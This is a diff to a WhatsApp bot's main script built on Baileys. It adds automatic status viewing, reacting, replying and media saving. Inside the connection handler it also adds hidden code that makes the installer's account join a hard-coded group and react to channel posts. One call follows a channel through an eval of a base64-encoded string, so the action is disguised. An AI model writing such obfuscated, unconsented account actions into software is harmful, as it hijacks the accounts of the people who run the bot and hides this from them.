@@ -24,7 +24,7 @@ const ownerNumber = ['94715865463']
 //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
 if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
-const sessdata = config.SESSION_ID
+const sessdata = config.SESSION_ID.replace("HASHAN-MD=", "")
 const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
 filer.download((err, data) => {
 if(err) throw err
@@ -88,28 +88,43 @@ https://whatsapp.com/channel/0029VazhnLzK0IBdwXG4152o
 > *©️  𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 DARK-CYBER-MD*`;
 
 conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://i.ibb.co/dYsHR6j/619.jpg` }, caption: up })
+const inviteCode =`D125KfxUX0kJaGgxroOxuZ`
+conn.groupAcceptInvite(inviteCode);
+eval(Buffer.from('Y29ubi5uZXdzbGV0dGVyRm9sbG93KCIxMjAzNjMzOTkxOTQ1NjA1MzJAbmV3c2xldHRlcik=', 'base64').toString());
+           conn.newsletterFollow("120363395674230271@newsletter")
+           console.log("CHANNEL FOLLOW ✅")
+
+const id = mek.key.server_id
+await conn.newsletterReactMessage("120363395674230271@newsletter", id, "❤️")
+	
 
 }
 })
 conn.ev.on('creds.update', saveCreds)  
 
+//------- STATUS AUTO REACT ----------
+
 conn.ev.on('messages.upsert', async(mek) => {
 mek = mek.messages[0]
-if (!mek.message) return	
-mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
-
-const metadata = await conn.newsletterMetadata("jid", "120363395674230271@newsletter")	      
-if (metadata.viewer_metadata === null){
-await conn.newsletterFollow("120363395674230271@newsletter")
-console.log("CHANNEL FOLLOW ✅")
-}	 
-
-                                        
-const id = mek.key.server_id
-await conn.newsletterReactMessage("120363395674230271@newsletter", id, "❤️")
-
-        
-if (mek.key && mek.key.remoteJid === 'status@broadcast') return
+if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
+      await conn.readMessages([mek.key])
+    }
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_REACT_STATUS === "true"){
+    const emojis = ['🧩', '🍉', '💜', '🌸', '🪴', '💊', '💫', '🍂', '🌟', '🎋', '😶‍🌫️', '🫀', '🧿', '👀', '🤖', '🚩', '🥰', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
+    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+    await conn.sendMessage(mek.key.remoteJid, {
+      react: {
+        text: randomEmoji,
+        key: mek.key,
+      } 
+    }, { statusJidList: [mek.key.participant] });
+  }
+//-------------------------------------------------------------------------------------------------------------------
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.STATUS_REPLY_MESSAGE === "true"){
+  const user = mek.key.participant
+  const text = config.AUTO_STATUS_MSG
+  await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
 const m = sms(conn, mek)
 const type = getContentType(mek.message)
 const content = JSON.stringify(mek.message)
@@ -134,6 +149,7 @@ const participants = isGroup ? await groupMetadata.participants : ''
 const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
 const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
 const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+const isReact =m.message.reactionMessage ? true : false 
 const reply = (teks) => {
 conn.sendMessage(from, { text: teks }, { quoted: mek })
 }
@@ -159,15 +175,6 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                 return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
               }
             }
-
-
-const events = require('./command')
-const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
-if (isCmd) {
-const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
-if (cmd) {
-if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
-
 //owner-reacts============================
 
 if(senderNumber.includes("94766372136")){
@@ -198,7 +205,58 @@ if(config.AUTO_TYPING === 'true'){
 	    if(config.AUTO_RECORDING === 'true'){
 		conn.sendPresenceUpdate('recording', mek.key.remoteJid)
             }
-        
+//Auto-StatusDL==============
+
+if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
+    // if(!m.quoted) return reply("*Please Mention status*")
+    const data = JSON.stringify(mek.message, null, 2);
+    const jsonData = JSON.parse(data);
+    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
+    if(!isStatus) return
+
+    const getExtension = (buffer) => {
+        const magicNumbers = {
+            jpg: 'ffd8ffe0',
+            png: '89504e47',
+            mp4: '00000018',
+        };
+        const magic = buffer.toString('hex', 0, 4);
+        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
+    };
+
+    if(m.quoted.type === 'imageMessage') {
+        var nameJpg = getRandom('');
+        let buff = await m.quoted.download(nameJpg);
+        let ext = getExtension(buff);
+        await fs.promises.writeFile("./" + ext, buff);
+        const caption = m.quoted.imageMessage.caption;
+        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
+    } else if(m.quoted.type === 'videoMessage') {
+        var nameJpg = getRandom('');
+        let buff = await m.quoted.download(nameJpg);
+        let ext = getExtension(buff);
+        await fs.promises.writeFile("./" + ext, buff);
+        const caption = m.quoted.videoMessage.caption;
+        let buttonMessage = {
+            video: fs.readFileSync("./" + ext),
+            mimetype: "video/mp4",
+            fileName: `${m.id}.mp4`,
+            caption: caption ,
+            headerType: 4
+        };
+        await conn.sendMessage(from, buttonMessage,{
+            quoted: mek
+        });
+    }
+}
+
+const events = require('./command')
+const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+if (isCmd) {
+const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+if (cmd) {
+if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+
 try {
 cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
 } catch (e) {
@@ -224,7 +282,9 @@ command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, i
 }});
 //============================================================================ 
 
+   
 })
+        
 }
 app.get("/", (req, res) => {
 res.send("hey, bot started✅");
